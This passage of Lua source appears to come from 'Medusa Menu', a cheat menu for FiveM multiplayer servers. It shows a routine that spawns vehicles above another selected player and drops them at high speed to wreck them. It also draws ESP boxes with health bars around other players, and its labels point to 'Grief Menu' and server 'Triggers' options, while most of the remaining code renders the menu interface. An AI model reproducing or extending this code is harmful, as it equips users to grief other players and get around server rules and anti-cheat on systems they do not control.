                    SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
                    SetVehicleDoorBroken(playerVeh, 0, true)
                    SetVehicleDoorBroken(playerVeh, 1, true)
                    SetVehicleDoorBroken(playerVeh, 2, true)
                    SetVehicleDoorBroken(playerVeh, 3, true)
                    SetVehicleDoorBroken(playerVeh, 4, true)
                    SetVehicleDoorBroken(playerVeh, 5, true)
                    SetVehicleDoorBroken(playerVeh, 6, true)
                    SetVehicleDoorBroken(playerVeh, 7, true)
                    SetVehicleLights(playerVeh, 1)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
                    SetVehicleNumberPlateTextIndex(playerVeh, 5)
                    SetVehicleNumberPlateText(playerVeh, "Medusa Menu")
                    SetVehicleDirtLevel(playerVeh, 10.0)
                    SetVehicleModColor_1(playerVeh, 1)
                    SetVehicleModColor_2(playerVeh, 1)
                    SetVehicleCustomPrimaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b) -- r = 231, g = 76, b = 60
                    SetVehicleCustomSecondaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b)
                    SetVehicleBurnout(playerVeh, true)
                end
            end
        end)
    else
        Citizen.CreateThread(function()
            for i = 1, amount do
                Citizen.Wait(25)
                local VehicleHash = GetHashKey(tostring(veh))
                RequestModel(VehicleHash)
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                while not HasModelLoaded(VehicleHash) do
                    RequestModel(VehicleHash)
                    Citizen.Wait(15)
                end
                local SpawnedVeh = CreateVehicle(VehicleHash, x, y, z + 20.0, 0.0, true, false)
                SetVehicleNumberPlateText(SpawnedVeh, "MEDUSA")
                SetEntityVelocity(SpawnedVeh, 0.0, 0.0, -100.0)
                if amount == 2 then
                    NetworkRequestControlOfNetworkId(SpawnedVeh)
                    playerVeh = SpawnedVeh
                    NetworkRequestControlOfEntity(playerVeh)
                    StartVehicleAlarm(playerVeh)
                    DetachVehicleWindscreen(playerVeh)
                    SmashVehicleWindow(playerVeh, 0)
                    SmashVehicleWindow(playerVeh, 1)
                    SmashVehicleWindow(playerVeh, 2)
                    SmashVehicleWindow(playerVeh, 3)
                    SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
                    SetVehicleDoorBroken(playerVeh, 0, true)
                    SetVehicleDoorBroken(playerVeh, 1, true)
                    SetVehicleDoorBroken(playerVeh, 2, true)
                    SetVehicleDoorBroken(playerVeh, 3, true)
                    SetVehicleDoorBroken(playerVeh, 4, true)
                    SetVehicleDoorBroken(playerVeh, 5, true)
                    SetVehicleDoorBroken(playerVeh, 6, true)
                    SetVehicleDoorBroken(playerVeh, 7, true)
                    SetVehicleLights(playerVeh, 1)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
                    SetVehicleNumberPlateTextIndex(playerVeh, 5)
                    SetVehicleNumberPlateText(playerVeh, "Medusa Menu")
                    SetVehicleDirtLevel(playerVeh, 10.0)
                    SetVehicleModColor_1(playerVeh, 1)
                    SetVehicleModColor_2(playerVeh, 1)
                    SetVehicleCustomPrimaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b) -- r = 231, g = 76, b = 60
                    SetVehicleCustomSecondaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b)
                    SetVehicleBurnout(playerVeh, true)
                end
            end
        end)
    end
end

Medusa.Functions.Print = function(args)
    if args ~= nil then
        if Medusa.debug then print("[Medusa] ".. args) end
    end
end

local notifyPreviousText = nil

local notifyQueue = 0

-- Free up the "p.notif" table if notification is no longer being drawn on screen
local function NotifyRecycle()
	--local disposeList = {}
	local notif = properties.notif

	-- Medusa.Functions.Print("^3NotifyRecycle: ^0Old table size: ^3" .. #p.notif)

	local drawnTable = {}

	-- allocate notifications currently on screen to drawnTable
	for i, _ in pairs(notif) do
		if notif[i].draw then
			drawnTable[i] = notif[i]
		end
	end

	-- remove notifications if they aren't drawing; shrinks size of table
	notif = drawnTable


	-- Medusa.Functions.Print("^3NotifyRecycle: ^0New table size: ^3" .. #p.notif)
	-- Medusa.Functions.Print("^3NotifyRecycle: ^4Returning: ^3" .. #p.notif + 1)
	return #notif + 1
end

-- Responsible for making sure the notification 'stick' to the menu footer
local function NotifyRecalibrate()
	local p = properties
	local stackIndex = 0

	for id, _ in pairs(p.notif) do
		if p.notif[id].draw then
			stackIndex = stackIndex + 1
		end
	end

	-- Medusa.Functions.Print("^5Recalibrate:^0 table size is " .. stackIndex)

	for id, _ in pairs(p.notif) do
		if p.notif[id].draw then
			if p.notif[id].tin then p.notif[id].tin = false end
			-- if p.notif[id].makeRoom then p.notif[id].makeRoom = false end

			-- Medusa.Functions.Print("^5Recalibrate ID: ^0" .. id)
			p.notif[id].y = (p.y - notifyBody.footerYOffset) + ((notifyBody.height + ((p.notif[id].lines - 1) * notifyBody.height) + notifyBody.gap) * (stackIndex - 1))
		
			stackIndex = stackIndex - 1
		end
	end
end

-- Define thread function
local function NotifyNewThread(options)
	local text = options.text or notifyDefault.text
	local transition = options.transition or notifyDefault.transition
	local timeout = options.timeout or notifyDefault.timeout
	local type = options.type or notifyDefault.type
	local sound = sound_type[type]
	
	local p = properties

	local nbrLines = NotifyCountLines(p, text)

	local beginY = 0.0
	local beginAlpha = 0
	
	-- garbage queueing system :)
	notifyQueue = notifyQueue + transition
	Wait(notifyQueue - transition)
	
	local id = NotifyRecycle()

	--Medusa.Functions.Print("^3-------- Notification " .. id .. " " .. type .. "--------")
	p.notif[id] = {
		x = p.x,
		y = 0,
		type = type,
		opacity = 0,
		lines = nbrLines,
		tin = true,
		draw = true,
		tout = false,
	}

	p.offset(p.notif, id, transition) --(0.05 * (id - 1))
	
	-- Drawing
	local function NotifyDraw()
		SetScriptGfxDrawOrder(5)
		while p.notif[id].draw do
			if Medusa.IsAnyMenuOpened() then
			end
			Wait(0)
		end
	
		-- Schedule notification for garbage collection
		p.notif[id].dispose = true
	end
	CreateThread(NotifyDraw)

	-- Transition In
	local function NotifyFadeIn()
		local change = p.y - notifyBody.footerYOffset

		local timer = 0
	
		local function SetTimerIn() -- set the timer to 0
			timer = GetGameTimer()
		end
	
		local function GetTimerIn() -- gets the timer (counts up)
			return GetGameTimer() - timer
		end
		
		PlaySoundFrontend(-1, sound.name, sound.set, true)
	
		SetTimerIn() -- reset current timer to 0
		while p.notif[id].tin do
			local tinY = outCubic(GetTimerIn(), beginY, change, transition)
			local tinAlpha = inOutCubic(GetTimerIn(), beginAlpha, 255, transition)
	
			if p.notif[id].y >= change then
				p.notif[id].y = change
				p.notif[id].tin = false
				break
			else
				p.notif[id].y = tinY
				p.notif[id].opacity = floor(tinAlpha + 0.5)
			end
			Wait(5)
		end
		notifyQueue = notifyQueue - transition
		p.notif[id].opacity = 255
	end
	CreateThread(NotifyFadeIn)

	-- Fade out wait timeout
	Wait(timeout + transition)
	p.notif[id].beginOut = true
	p.notif[id].tout = true
	
	-- Fade out
	local function NotifyFadeOut()
		local timer = 0
	
		local function SetTimerOut(ms)
			timer = GetGameTimer() - ms
		end
	
		local function GetTimerOut()
			return GetGameTimer() - timer
		end
	
		while p.notif[id].draw do
			while p.notif[id].tout do
				
				if p.notif[id].beginOut then 
					SetTimerOut(0)
					p.notif[id].beginOut = false 
				end
	
				local opa = inOutCubic(GetTimerOut(), 255, -510, transition)
				if opa <= 0 then
	
					p.notif[id].tout = false
					p.notif[id].draw = false
	
					break
				else
					p.notif[id].opacity = floor(opa + 0.5)
				end
				Wait(5)
			end
			
			Wait(5)
		end
	end
	CreateThread(NotifyFadeOut)
end


local function debugPrint(text)
	if Medusa.debug then
		Citizen.Trace("[MedusaUI] " .. text)
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, restoreIndex)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)
		setMenuProperty(id, "currentOption", 1)

		if restoreIndex then
			setMenuProperty(id, "currentOption", menus[id].storedOption)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuProperty(currentMenu, "storedOption", menus[currentMenu].currentOption)
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end

		
		if dynamicColorTheme then

			if isMenuVisible("SelfMenu") then
				_menuColor.base = themeColors.green
			elseif isMenuVisible("OnlinePlayersMenu") then
				_menuColor.base = themeColors.blue
			elseif isMenuVisible("VisualMenu") then
				_menuColor.base = themeColors.white
			elseif isMenuVisible("TeleportMenu") then
				_menuColor.base = themeColors.yellow
			elseif isMenuVisible("LocalVehicleMenu") then
				_menuColor.base = themeColors.orange
			elseif isMenuVisible("LocalWepMenu") then
				_menuColor.base = themeColors.red
			elseif isMenuVisible("MedusaMainMenu") then
				_menuColor.base = themeColors.purple 
			end
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale / aspectRatio, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	BeginTextCommandDisplayText("text_buffer")
	AddTextComponentString(text)
	EndTextCommandDisplayText(x, y)
end

local function drawPreviewText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale / aspectRatio, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			local rX = menus[currentMenu].x - frameWidth / 2 - frameWidth - previewWidth / 2
			SetTextWrap(rX, rX + previewWidth / 2 - buttonTextXOffset / 2)
			SetTextRightJustify(true)
		end
	end
	BeginTextCommandDisplayText("preview_text_buffer")
	AddTextComponentString(text)
	EndTextCommandDisplayText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

Medusa.Functions.Draw2DEspToPed = function(pPed)
	local distance = (#(GetEntityCoords(PlayerPedId()) - GetEntityCoords(pPed)))
	local color_esp = Medusa.Config.ESP.box.colorLow
	local color_health = {r = 20, g = 235, b = 20, a = 255}
	local player_health = GetEntityHealth(pPed)
	
	if player_health <= 15 then
		color_health = {r = 255, g = 0, b = 0, a = 255}
	elseif player_health >= 15 and player_health <= 80 then
		color_health = {r = 0, g = 0, b = 255, a = 255}
	elseif player_health >= 80 then
		color_health = {r = 0, g = 255, b = 0, a = 255}
	end

	if player_health > 0 then
		if distance >= 0 and distance < 25 then
			color_esp = Medusa.Config.ESP.box.colorLow
		elseif distance >= 25 and distance < 150 then
			color_esp = Medusa.Config.ESP.box.colorMedium
		elseif distance >= 150 then
			color_esp = Medusa.Config.ESP.box.colorHigh
		end
	else
		color_health = {r = 255, g = 0, b = 0, a = 255}
		color_esp = Medusa.Config.ESP.box.colorHigh
	end

	local x_head, y_head, z_head = table.unpack(GetPedBoneCoords(pPed, 31086, 0, 0, 0))
	local x_foot, y_foot, z_foot = table.unpack(GetPedBoneCoords(pPed, 0, 0, 0, 0))
	local x_center, y_center, z_center = table.unpack(GetPedBoneCoords(pPed, 0, 0, 0, 0))

	local onScreen, x_foot, y_foot = World3dToScreen2d(x_foot, y_foot, z_foot - 1.1, 0) -- Pie
	local onScreen, x_head, y_head = World3dToScreen2d(x_head, y_head, z_head + 0.2, 0) -- Cabeza
	local onScreen, x_center, y_center = World3dToScreen2d(x_center, y_center, z_center, 0) -- Centro
	local width = y_head - y_foot
	if y_head - y_foot < 0.0 and y_head - y_foot > -1 and onScreen then
		local left_line_x = x_center - width * -0.115
		local right_line_x = x_center - width * 0.115

		local healt_bar_math = tostring(((0.012*(player_health)) - 2.4) / 10.0)
		local healt_line = (right_line_x - left_line_x) - width * healt_bar_math

		local Y_DOWN = y_center - width * 0.50
		local Y_UP = y_center - width * -0.50
		local YHealth = y_center - width * -0.55

		drawRect(left_line_x, y_center, 0.0019, y_head - y_foot, color_esp)
		drawRect(right_line_x, y_center, 0.0019, y_head - y_foot, color_esp)

		drawRect(x_center, Y_DOWN, right_line_x - left_line_x, 0.0019, color_esp)
		drawRect(x_center, Y_UP, right_line_x - left_line_x, 0.0019, color_esp)
		
		if player_health > 0 then
			drawRect(x_center, YHealth, healt_line, 0.0059, color_health)
		end
	end
end

-- [NOTE] MenuDrawTitle
local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 0.91
		if menus[currentMenu].background == "default" then
			if _menuColor.base == themeColors.purple then
				drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
			else
				DrawSpriteScaled("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- 255, 76, 60,
				DrawSpriteScaled("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end
		elseif menus[currentMenu].background == "weaponlist" then
			if _menuColor.base == themeColors.purple then
				DrawSpriteScaled("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 255, 255, 140) -- 255, 76, 60,
			else
				DrawSpriteScaled("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end
			 -- rgb(155, 89, 182)
		elseif menus[currentMenu].titleBackgroundSprite then
			DrawSpriteScaled(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			1,
			{ r = 10, g = 223, b = 152, a = 255 },
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		-- Header
		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].menuFrameColor)
		-- Separator
		drawRect(x, y + (buttonHeight / 2) + (separatorHeight / 2), menuWidth, separatorHeight, _menuColor.base)

		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			_menuColor.base,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				_menuColor.base,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local welcomeMsg = true
rgb1 = {
    r = 255,
    g = 255,
    b = 255,
    a = 255,
}
rgb2 = {
    r = 255,
    g = 255,
    b = 255,
    a = 255,
}
rgb3 = {
    r = 255,
    g = 255,
    b = 255,
    a = 255,
}
rgb4 = {
    r = 255,
    g = 255,
    b = 255,
    a = 255,
}

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        local function RGBRainbow1( frequency )
            local result = {}
            local curtime = GetGameTimer() / 250
        
            result.r = math.floor( math.sin( curtime * frequency + 0 ) * 127 + 128 )
            result.g = math.floor( math.sin( curtime * frequency + 2 ) * 127 + 128 )
            result.b = math.floor( math.sin( curtime * frequency + 4 ) * 127 + 128 )
            
            return result
        end
        local function RGBRainbow2( frequency )
            local result = {}
            local curtime = GetGameTimer() / 250
        
            result.r = math.floor( math.sin( curtime * frequency + 0 ) * 126 + 127 )
            result.g = math.floor( math.sin( curtime * frequency + 2 ) * 126 + 127 )
            result.b = math.floor( math.sin( curtime * frequency + 4 ) * 126 + 127 )
            
            return result
        end
        local function RGBRainbow3( frequency )
            local result = {}
            local curtime = GetGameTimer() / 250
        
            result.r = math.floor( math.sin( curtime * frequency + 0 ) * 125 + 126 )
            result.g = math.floor( math.sin( curtime * frequency + 2 ) * 125 + 126 )
            result.b = math.floor( math.sin( curtime * frequency + 4 ) * 125 + 126 )
            
            return result
        end
        local function RGBRainbow4( frequency )
            local result = {}
            local curtime = GetGameTimer() / 250
        
            result.r = math.floor( math.sin( curtime * frequency + 0 ) * 124 + 125 )
            result.g = math.floor( math.sin( curtime * frequency + 2 ) * 124 + 125 )
            result.b = math.floor( math.sin( curtime * frequency + 4 ) * 124 + 125 )
            
            return result
        end

        rgb1 = RGBRainbow1(1)
        rgb2 = RGBRainbow2(1)
        rgb3 = RGBRainbow3(1)
        rgb4 = RGBRainbow4(1)
    end
end)



local function drawFooter()
	if menus[currentMenu] then
		local multiplier = nil
		local x = menus[currentMenu].x + menuWidth / 2
		-- local y = menus[currentMenu].y + titleHeight - 0.015 + buttonHeight + menus[currentMenu].maxOptionCount * buttonHeight
		-- DrawSpriteScaled("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- r = 231, g = 76, b = 60
		local g_color = { r = 10, g = 223, b = 152, a = 255 }
		

		if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
			multiplier = optionCount
		elseif optionCount >= menus[currentMenu].currentOption then
			multiplier = 10
		end

		if multiplier then
            local SetUpHeaderUp = false
			local y = menus[currentMenu].y + titleHeight + buttonHeight + separatorHeight + (buttonHeight * multiplier + 0.1) --0.015
			Medusa.Data.YDownRef = y + (-0.220 / 2.2)
			local y_up = menus[currentMenu].y + menuWidth / 2

            --Medusa.Functions.Print("Importante: " .. y_up)

			-- Footer
            --Medusa.Functions.Print(y)
			drawRect(x, y + (-0.220 / 2.2), menuWidth, 0.002, g_color)
            drawRect(x, y_up - 0.051, menuWidth, 0.002, g_color)
			drawRect(x, y_up + 0.02, menuWidth, 0.002, g_color)

			local yFrame = menus[currentMenu].y + titleHeight + ((buttonHeight + separatorHeight + (buttonHeight * multiplier) + footerHeight) / 2)
			local frameHeight = buttonHeight + separatorHeight + footerHeight + (buttonHeight * multiplier)
			-- Frame Left
			drawRect(x - menuWidth / 2, yFrame - 0.025, 0.0010, frameHeight + 0.009, g_color)
			-- Frame Right
			drawRect(x + menuWidth / 2, yFrame - 0.025, 0.0010, frameHeight + 0.009, g_color)

			




			local offset = 1.0 - (y + footerHeight / 2 + notifyBody.height)

			if notifyBody.footerYOffset ~= offset then
				notifyBody.footerYOffset = offset
				NotifyRecalibrate()
			end
		end

		if welcomeMsg then
			welcomeMsg = false
			Medusa.SendNotification({text = "If you experience any issues, please contact Apolo#2002 & NachoASD#5887 on Discord!", type = "info"})
		end
	end
end

local function drawButton(text, subText, color, subcolor)
	local function Oscilate( frequency )
		local result = {}
		local curtime = GetGameTimer() / 900
	
		result = math.floor( math.sin( curtime * frequency + 0 ) * 100 + 150 )
		
		return result
	end

	local oscilate = Oscilate(1)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
	local pointer = true

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + 0.0025 + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = color or menus[currentMenu].menuFocusTextColor
			pointColor = menus[currentMenu].menuFocusPointerColor
			subTextColor = subcolor or menus[currentMenu].menuSubTextColor
			selectionColor = { r = 255, g = 255, b = 255, a = 255 }
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = color or menus[currentMenu].menuTextColor
			pointColor = menus[currentMenu].menuInvisibleColor
			subTextColor = subcolor or menus[currentMenu].menuSubTextColor
			selectionColor = menus[currentMenu].menuInvisibleColor
			--shadow = true
		end

		local margin = 0.09

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)

		if (text ~= "~r~Grief Menu" and text ~= "~b~Menu Settings") and menus[currentMenu].subTitle == "MAIN MENU" then -- and subText == "isMenu"


			if text == "Self" then
				-- w/h = 0.02
				margin = margin - 0.0025
				DrawSpriteScaled("mpleaderboard", "leaderboard_male_icon", menus[currentMenu].x + buttonSpriteXOffset + margin - 0.02, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 26, 188, 156, oscilate + 10) -- rgb(26, 188, 156)
				DrawSpriteScaled("mpleaderboard", "leaderboard_female_icon", menus[currentMenu].x + buttonSpriteXOffset + margin + 0.012, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 26, 188, 156, oscilate + 10) -- rgb(26, 188, 156)
			elseif text == "Others" then
				margin = margin - 0.006
				DrawSpriteScaled("mpleaderboard", "leaderboard_globe_icon", menus[currentMenu].x + buttonSpriteXOffset + margin - 0.02, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 26, 188, 156, oscilate + 20) -- rgb(26, 188, 156)
				DrawSpriteScaled("mpleaderboard", "leaderboard_globe_icon", menus[currentMenu].x + buttonSpriteXOffset + margin + 0.02, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 26, 188, 156, oscilate + 20) -- rgb(26, 188, 156)
			elseif text == "Misc" then
				margin = margin - 0.004
				DrawSpriteScaled("mpleaderboard", "leaderboard_rankshield_icon", menus[currentMenu].x + buttonSpriteXOffset + margin - 0.02, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 26, 188, 156, oscilate + 30) -- rgb(26, 188, 156)
				DrawSpriteScaled("mpleaderboard", "leaderboard_rankshield_icon", menus[currentMenu].x + buttonSpriteXOffset + margin + 0.015, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 26, 188, 156, oscilate + 30) -- rgb(26, 188, 156)
			elseif text == "Triggers" then
				margin = margin - 0.0085
				DrawSpriteScaled("mpleaderboard", "leaderboard_plus_icon", menus[currentMenu].x + buttonSpriteXOffset + margin - 0.02, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 26, 188, 156, oscilate + 40) -- rgb(26, 188, 156)
				DrawSpriteScaled("mpleaderboard", "leaderboard_plus_icon", menus[currentMenu].x + buttonSpriteXOffset + margin + 0.025, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 26, 188, 156, oscilate + 40) -- rgb(26, 188, 156)
			elseif text == "Online Options" then
				DrawSpriteScaled("mpleaderboard", "leaderboard_friends_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 152, 219, 255) -- rgb(52, 152, 219)
			elseif text == "Visual Options" then
				DrawSpriteScaled("mphud", "spectating", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 236, 240, 241, 255) -- rgb(236, 240, 241)
			elseif text == "Teleport Options" then
				DrawSpriteScaled("mpleaderboard", "leaderboard_star_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 241, 196, 15, 255) -- rgb(241, 196, 15)
			elseif text == "Vehicle Options" then
				DrawSpriteScaled("mpleaderboard", "leaderboard_transport_car_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 230, 126, 34, 255) -- rgb(230, 126, 34)
			elseif text == "Weapon Options" then
				DrawSpriteScaled("mpleaderboard", "leaderboard_kd_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 231, 76, 60, 255) -- rgb(231, 76, 60)
			elseif text == "Server Options" then
				DrawSpriteScaled("mpleaderboard", "leaderboard_globe_icon", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 155, 89, 182, 255) -- rgb(155, 89, 182)
			end
			
			drawText(
				text,
				menus[currentMenu].x + margin,
				y - (buttonHeight / 2) + buttonTextYOffset,
				buttonFont,
				textColor,
				buttonScale,
				false,
				shadow
				)
		else
			drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
			)
		end

		if subText == "isMenu" then
			if menus[currentMenu].subTitle ~= "MAIN MENU" then
				DrawSpriteScaled("mparrow", "mp_arrowlarge", x + menuWidth / 2.25, y, 0.0045, nil, 0.0, 10, 223, 152, 255)
			end
			-- menus[currentMenu].title = ""
		elseif subText == "toggleOff" then
			x = x + menuWidth / 2 - frameWidth / 2 - toggleOuterWidth / 2 - buttonTextXOffset
			drawRect(x, y, toggleOuterWidth - 0.0015, toggleOuterHeight - 0.002, { r = 10, g = 223, b = 152, a = 255 })
			drawRect(x, y, toggleInnerWidth, toggleInnerHeight, {r = 90, g = 90, b = 90, a = 230})
		elseif subText == "toggleOn" then
			x = x + menuWidth / 2 - frameWidth / 2 - toggleOuterWidth / 2 - buttonTextXOffset
			drawRect(x, y, toggleOuterWidth - 0.0015, toggleOuterHeight - 0.002, { r = 10, g = 223, b = 152, a = 255 })
			drawRect(x, y, toggleInnerWidth, toggleInnerHeight, {r = 90, g = 90, b = 90, a = 230})
			DrawSpriteScaled("commonmenu", "shop_tick_icon", x, y, 0.0135, nil, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			--drawRect(x, y, toggleInnerWidth, toggleInnerHeight, _menuColor.base) -- 26, 188, 156, 255
		elseif subText == "danger" then
			DrawSpriteScaled("commonmenu", "mp_alerttriangle", x + menuWidth / 2.35, y, 0.021, nil, 0.0, 255, 255, 255, 255)
		elseif subText then			
			drawText(
				subText,
				menus[currentMenu].x + 0.005,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)

		end

	end
end

local function drawComboBox(text, selectedIndex)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
	local pointer = true

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + 0.0025 + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		
		local backgroundColor = menus[currentMenu].menuBackgroundColor
		local textColor = menus[currentMenu].menuTextColor
		local subTextColor = menus[currentMenu].menuSubTextColor
		local pointColor = menus[currentMenu].menuInvisibleColor
		
		local textX = x + menuWidth / 2 - frameWidth - buttonTextXOffset
		local selected = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = _menuColor.base
			pointColor = menus[currentMenu].menuSubTextColor
			textX = x + menuWidth / 2.25 - 0.019
			selected = true
		end

		-- Button background
		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)

		-- Button title
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false
		)
		
		-- DrawSpriteScaled("mparrow", "mp_arrowlarge", x + menuWidth / 2.25, y, 0.008, nil, 0.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)			

		DrawSpriteScaled("pilotschool", "hudarrow", x + menuWidth / 2 - frameWidth / 2 - sliderWidth, y + separatorHeight / 2, 0.008, nil, -90.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
		
		-- Selection Text
		drawText(
			selectedIndex,
			textX,
			y - separatorHeight - (buttonHeight / 2 - fontHeight / 2) ,
			buttonFont,
			subTextColor,
			buttonScale,
			selected,
			false,
			not selected
		)	

		DrawSpriteScaled("pilotschool", "hudarrow", x + menuWidth / 2.25, y + separatorHeight / 2, 0.008, nil, 90.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
	end
end

-- Invokes NotifyNewThread
function Medusa.SendNotification(options)
